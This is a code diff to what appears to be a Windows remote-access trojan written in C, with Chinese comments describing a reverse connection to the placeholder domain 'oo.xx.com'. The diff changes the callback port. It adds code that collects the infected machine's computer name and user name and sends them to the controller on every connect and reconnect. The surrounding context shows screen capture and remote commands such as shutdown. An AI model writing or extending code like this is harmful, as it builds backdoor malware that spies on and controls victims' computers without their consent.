@@ -11,7 +11,7 @@
 #define MSG_LEN 1024
 
 char ServerAddr[] = "oo.xx.com"; //反弹连接的域名
-int ServerPort = 8080;  //连接的端口
+int ServerPort = 8083;  //连接的端口
 int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);
 
 
@@ -245,6 +245,16 @@ void c_socket()
 		return;
 	}
 
+	//获取主机名、用户名
+	char userName[20]={0};
+	char comName[20]={0};
+	char comInfo[40]={0};
+	DWORD nameLen = 20;
+	DWORD comLen = 20;
+	GetUserName(userName,&nameLen);
+	GetComputerName(comName,&comLen);
+	sprintf(comInfo, "%s#%s", comName, userName);
+
 	// 连接到服务器.
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
@@ -256,7 +266,8 @@ void c_socket()
 			printf( "\nFailed to connect.\nWait 10s...\n" );
 			Sleep(2000);
 			continue;
-		}else { 
+		}else {
+			send(client,comInfo, 40, 0);
 			break;
 		}
 	}
@@ -278,7 +289,10 @@ void c_socket()
 					printf( "\nFailed to connect.\nWait 10s...\n" );
 					Sleep(2000);
 					continue;
-				}else break;
+				}else {
+					send(client,comInfo, 40, 0);
+					break;
+				}
 			}
 			continue;
 		}else if(strcmp(recvCmd,"shutdown")==0){  //关机
